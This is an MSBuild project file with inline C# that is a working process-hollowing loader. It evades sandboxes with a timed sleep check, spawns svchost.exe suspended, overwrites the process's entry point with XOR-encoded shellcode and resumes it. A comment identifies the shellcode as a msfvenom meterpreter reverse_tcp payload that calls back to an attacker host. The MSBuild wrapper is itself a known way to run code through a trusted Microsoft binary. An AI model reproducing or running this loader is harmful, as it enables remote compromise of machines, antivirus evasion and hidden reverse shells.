<!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe processHollow.csproj -->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Hello">
    <ClassExample />
  </Target>
  
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
          using System;
          using System.Runtime.InteropServices;
          using System.Threading;

          public class ClassExample : Microsoft.Build.Utilities.Task
          {
              // Define necessary structures
              [StructLayout(LayoutKind.Sequential)]
              public struct STARTUPINFO
              {
                  public uint cb;
                  public string lpReserved;
                  public string lpDesktop;
                  public string lpTitle;
                  public uint dwX;
                  public uint dwY;
                  public uint dwXSize;
                  public uint dwYSize;
                  public uint dwXCountChars;
                  public uint dwYCountChars;
                  public uint dwFillAttribute;
                  public uint dwFlags;
                  public ushort wShowWindow;
                  public ushort cbReserved2;
                  public IntPtr lpReserved2;
                  public IntPtr hStdInput;
                  public IntPtr hStdOutput;
                  public IntPtr hStdError;
              }

              [StructLayout(LayoutKind.Sequential)]
              public struct PROCESS_INFORMATION
              {
                  public IntPtr hProcess;
                  public IntPtr hThread;
                  public uint dwProcessId;
                  public uint dwThreadId;
              }

              [StructLayout(LayoutKind.Sequential)]
              public struct CLIENT_ID
              {
                  public IntPtr UniqueProcess;
                  public IntPtr UniqueThread;
              }

              [StructLayout(LayoutKind.Sequential)]
              public struct PROCESS_BASIC_INFORMATION
              {
                  public IntPtr ExitStatus;
                  public IntPtr PebAddress;
                  public IntPtr AffinityMask;
                  public IntPtr BasePriority;
                  public IntPtr UniqueProcessId;
                  public IntPtr InheritedFromUniqueProcessId;
              }

              // Constants
              const uint CREATE_SUSPENDED = 0x00000004;
              const int ProcessBasicInformation = 0;

              // Function declarations
              [DllImport("kernel32.dll", SetLastError = true)]
              static extern bool CreateProcess(
                  string lpApplicationName,
                  string lpCommandLine,
                  IntPtr lpProcessAttributes,
                  IntPtr lpThreadAttributes,
                  bool bInheritHandles,
                  uint dwCreationFlags,
                  IntPtr lpEnvironment,
                  string lpCurrentDirectory,
                  ref STARTUPINFO lpStartupInfo,
                  out PROCESS_INFORMATION lpProcessInformation
              );

              [DllImport("ntdll.dll")]
              static extern int NtQueryInformationProcess(
                  IntPtr hProcess,
                  int processInformationClass,
                  ref PROCESS_BASIC_INFORMATION processInformation,
                  uint processInformationLength,
                  ref uint returnLength
              );

              [DllImport("ntdll.dll")]
              static extern int NtReadVirtualMemory(
                  IntPtr hProcess,
                  IntPtr lpBaseAddress,
                  byte[] lpblu3fer,
                  int NumberOfBytesToRead,
                  out IntPtr lpNumberOfBytesRead
              );

              [DllImport("kernel32.dll")]
              static extern bool WriteProcessMemory(
                  IntPtr hProcess,
                  IntPtr lpBaseAddress,
                  byte[] lpblu3fer,
                  int NumberOfBytesToWrite,
                  out IntPtr lpNumberOfBytesWritten
              );

              [DllImport("ntdll.dll", SetLastError = true)]
              static extern bool NtResumeProcess(IntPtr hThread);

              public static void Main()
              {
                  DateTime t1 = DateTime.Now;
                    System.Threading.Thread.Sleep(10000);
                    double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
                    if (deltaT < 9.5)
                    {
                        return;
                    }
                    
                  byte[] keyBytes = new byte[] { 0xB3, 0x1B, 0xFA, 0xEE };

                  STARTUPINFO si = new STARTUPINFO();
                  PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

                  bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);

                  PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
                  uint tmp = 0;
                  IntPtr hProcess = pi.hProcess;

                  NtQueryInformationProcess(hProcess, ProcessBasicInformation, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

                  IntPtr ptrImageBaseAddress = (IntPtr)((Int64)bi.PebAddress + 0x10);

                  byte[] baseAddressBytes = new byte[IntPtr.Size];
                  IntPtr nRead;
                  NtReadVirtualMemory(hProcess, ptrImageBaseAddress, baseAddressBytes, baseAddressBytes.Length, out nRead);
                  IntPtr imageBaseAddress = (IntPtr)(BitConverter.ToInt64(baseAddressBytes, 0));

                  byte[] data = new byte[0x200];
                  NtReadVirtualMemory(hProcess, imageBaseAddress, data, data.Length, out nRead);

                  uint e_lfanew = BitConverter.ToUInt32(data, 0x3C);
                  uint entrypointRvaOffset = e_lfanew + 0x28;
                  uint entrypointRva = BitConverter.ToUInt32(data, (int)entrypointRvaOffset);

                  IntPtr entrypointAddress = (IntPtr)((UInt64)imageBaseAddress + entrypointRva);

                  // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 -f csharp EXITFUNC=thread
                  byte[] blu3 = new byte[511] {0x4f,0x53,0x79,0x0a,0x43,0xf3,0x36,0xee,0xb3,0x1b,0xbb,0xbf,0xf2,0x4b,0xa8,0xbf,0xfb,0x2a,0x28,0x8b,0xfb,0x90,0xa8,0x8e,0xe5,0x53,0x71,0xbc,0xab,0x53,0x71,0xbc,0x93,0x53,0x71,0x9c,0xe3,0x56,0xcb,0x27,0xfb,0x14,0x4d,0xa4,0xf9,0x53,0xcb,0x2e,0x1f,0x27,0x9b,0x92,0xb1,0x37,0xda,0xaf,0x72,0xd2,0xf7,0xaf,0xb2,0xda,0x18,0x03,0xe1,0x5a,0xab,0xa6,0x38,0x49,0xda,0x65,0xf1,0x27,0xb2,0xef,0x63,0x7d,0x7b,0x96,0xab,0x10,0xf8,0xe1,0x36,0x69,0xfa,0xee,0xb3,0x90,0x7a,0x66,0xb3,0x1b,0xfa,0xa6,0x36,0xdb,0x8e,0x89,0xfb,0x1a,0x2a,0xaa,0x38,0x5b,0xda,0xbe,0xfa,0x1a,0x2a,0x65,0xfb,0x03,0x19,0xb8,0xfb,0xe4,0x33,0xaf,0x38,0x2f,0x72,0xa3,0x82,0xd2,0xb2,0xef,0x65,0x53,0xcb,0x2e,0x1f,0x5a,0x3b,0x27,0xbe,0x5a,0xfb,0x2f,0x8b,0xfb,0x8f,0x1f,0xff,0x18,0xb6,0xca,0xbb,0x5e,0xc3,0x3f,0xc6,0xc3,0xa2,0xaa,0x38,0x5b,0xde,0xa7,0xb2,0xcb,0x9c,0xaf,0x38,0x17,0xb2,0xaa,0x38,0x5b,0xe6,0xa7,0xb2,0xcb,0xbb,0x65,0xb7,0x93,0xb2,0xef,0x63,0x5a,0xa2,0xaf,0xeb,0x45,0xa3,0xb4,0xf2,0x43,0xbb,0xb7,0xf2,0x41,0xb2,0x6d,0x5f,0x3b,0xbb,0xbc,0x4c,0xfb,0xa2,0xaf,0xea,0x41,0xb2,0x65,0xa1,0xf2,0xb1,0x11,0x4c,0xe4,0xa7,0xa7,0x0d,0x6c,0x89,0xdc,0xec,0x28,0xc8,0xee,0xb3,0x5a,0xac,0xa7,0x3a,0xfd,0xb2,0x6f,0x5f,0xbb,0xfb,0xee,0xb3,0x52,0x73,0x0b,0xfa,0xa7,0xf8,0xee,0xb2,0xa0,0x3a,0x46,0x9e,0xa0,0xbb,0xba,0xfa,0x92,0x1e,0xa2,0x3a,0xea,0xbb,0x54,0xff,0x6c,0xdc,0xe9,0x4c,0xce,0xb6,0x67,0x59,0x73,0xfb,0xef,0xb3,0x1b,0xa3,0xaf,0x09,0x32,0x7a,0x85,0xb3,0xe4,0x2f,0x84,0xb9,0x5a,0xa4,0xbe,0xe3,0x56,0xcb,0x27,0xfe,0x2a,0x3a,0xa6,0x4c,0xdb,0xb2,0x67,0x71,0x53,0x05,0x2e,0xfb,0x92,0x3b,0xaf,0x09,0xf1,0xf5,0x31,0x53,0xe4,0x2f,0xa6,0x3a,0xdc,0x90,0xfe,0xf2,0x43,0xb6,0x67,0x51,0x53,0x73,0x17,0xf2,0xa1,0x63,0x4b,0xc7,0x7a,0x05,0x3b,0x36,0xdb,0x8e,0xe4,0xfa,0xe4,0x34,0x9b,0x56,0xf3,0x69,0xee,0xb3,0x1b,0xb2,0x6d,0x5f,0x0b,0xb2,0x67,0x51,0x56,0xcb,0x27,0xd9,0x1f,0xbb,0xb6,0xfb,0x92,0x03,0xaf,0x09,0x19,0x23,0x26,0xec,0xe4,0x2f,0x6d,0x4b,0x1b,0x84,0xbb,0xfb,0x98,0x3e,0xce,0xed,0x92,0x0c,0x84,0xf3,0x5a,0xa3,0x86,0xb3,0x0b,0xfa,0xee,0xf2,0x43,0xb2,0x67,0x41,0x53,0xcb,0x27,0xf2,0xa1,0xa2,0x4a,0xe0,0xfe,0x05,0x3b,0xfb,0x92,0x39,0xa7,0x3a,0xdc,0xb7,0xdf,0x7a,0x52,0x73,0x1e,0xfb,0x92,0x20,0xa6,0x3a,0xe2,0xbb,0x54,0xb1,0xc2,0x32,0xb1,0x4c,0xce,0x79,0x16,0xb3,0x66,0xd2,0xb6,0xf2,0x4c,0xa3,0x86,0xb3,0x5b,0xfa,0xee,0xf2,0x43,0x90,0xee,0xe9,0x5a,0x40,0xe5,0x9c,0x14,0xca,0x11,0x66,0x4c,0xa3,0xaf,0x09,0x6e,0x94,0xa3,0xd2,0xe4,0x2f,0xa7,0x4c,0xd5,0x13,0xd2,0x4c,0xe4,0x05,0xa6,0xb2,0xd8,0xb2,0xc7,0x75,0x53,0x7f,0x18,0xc6,0xaf,0xbb,0x11,0x54,0x43,0x90,0xee,0xea,0xa0,0x1a,0xf3,0x99,0x11,0xbb,0x67,0x69,0xe4,0x2f};
                  
                  for (int i = 0; i < blu3.Length; i++)
                  {
                    blu3[i] = (byte)((uint)blu3[i] ^ keyBytes[i % keyBytes.Length]);
                  }

                  WriteProcessMemory(hProcess, entrypointAddress, blu3, blu3.Length, out nRead);

                  NtResumeProcess(pi.hProcess);
              }

              public override bool Execute()
              {
                  Main();
                  return true;
              }
              
          }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>